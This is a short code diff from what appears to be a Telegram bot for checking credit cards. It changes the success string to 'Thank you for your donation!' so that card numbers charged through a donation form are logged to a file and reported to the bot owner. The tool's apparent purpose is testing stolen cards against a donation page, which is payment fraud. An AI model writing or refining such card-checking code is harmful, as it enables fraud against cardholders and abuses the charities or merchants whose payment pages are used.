@@ -95,7 +95,7 @@ by ➜ @strawhatchannel96 ''', reply_markup=mes)
 				
 				card_info = f"💳 Card: {cc.strip()} \n📝 Message: Response: {last}"
 
-				if "Payment Details" in last:
+				if "Thank you for your donation!" in last:
 				    with open("thank_cards.txt", "a") as thank_file:
 				        thank_file.write(card_info + "\n")
 				    bot.send_message(owner_id, f"✅ Thank Result Found:\n💳 Card: {cc.strip()}")
